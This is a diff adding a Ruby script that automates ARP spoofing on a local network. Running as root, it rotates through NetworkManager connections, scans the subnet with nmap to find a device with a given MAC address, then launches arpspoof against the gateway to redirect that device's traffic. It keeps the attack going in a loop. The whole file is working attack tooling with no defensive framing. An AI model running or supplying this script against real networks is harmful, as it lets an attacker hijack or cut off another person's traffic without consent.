@@ -1,0 +1,87 @@
+#!/usr/bin/env ruby
+require 'socket'
+
+if `id -u`.to_i > 0
+  puts "should run in root mode."
+  exit
+end
+
+interval=ARGV.first.to_i
+timeout=ARGV[1].to_i
+mac=ARGV[2]
+connections=ARGV[3..-1]
+puts "start working, accepted #{connections.size} connections to scan."
+
+cmd = nil
+spoofing_thread = nil
+connection=nil
+current_spoofing_ip=nil
+current_spoofing_connection=nil
+
+def till_succeed(cmd,timeout)
+  main_thread=Thread.current
+  succeed=false
+  res=nil
+  loop do
+    print "cmd:#{cmd}..."
+    returned = false 
+    tmp_thread = Thread.new do
+      res=`#{cmd} 2>/dev/null` 
+      returned = true
+      if $?.exitstatus == 0
+        succeed=true
+      else
+        puts 'failed'
+      end
+      main_thread.wakeup
+    end
+    sleep timeout
+    if !returned
+      puts "abandoned"
+      tmp_thread.kill 
+    end
+    if succeed
+      puts "succeed"
+    break
+    end
+  end
+rescue Interrupt
+rescue Exception
+  retry if !succeed
+ensure
+  return res
+end
+
+loop do
+  i=Socket.getifaddrs.select{|i|i.addr.ipv4? and !i.addr.ipv4_loopback?}.first
+  route_ip=till_succeed('route',timeout).split("\n")[2].split(' ')[1]
+  netmask=i.netmask.inspect_sockaddr.scan(/\d+/).map(&:to_i).inject(32){|i,j|i-Math.log(256-j,2)}.to_i
+  res=till_succeed("sudo nmap #{route_ip}/#{netmask} -sn",timeout)
+  res<<till_succeed("sudo nmap #{route_ip}/#{netmask} -sn",timeout)
+  if res.include?(mac)
+    res_arr = res.split("\n")
+    for i in 2..res_arr.length-1
+      if res_arr[i].include?(mac)
+        ip=res_arr[i-2].split(' ')[-1]
+        if (current_spoofing_ip == ip and current_spoofing_connection == connection)
+          puts "#{ip} is under spoofing."
+        else
+          spoofing_thread && spoofing_thread.kill
+          puts "start spoofing #{ip}."
+          spoofing_thread = Thread.new do
+            `sudo arpspoof -t #{route_ip} #{ip} 2>/dev/null`
+          end
+          current_spoofing_ip=ip
+          current_spoofing_connection=connection
+        end
+      end
+    end
+  else
+    spoofing_thread && spoofing_thread.kill
+    connection = connections.shift
+    connections.push connection
+    puts "switch to connection #{connection}."
+    till_succeed("sudo nmcli c u #{connection}",timeout)
+  end
+  sleep interval
+end
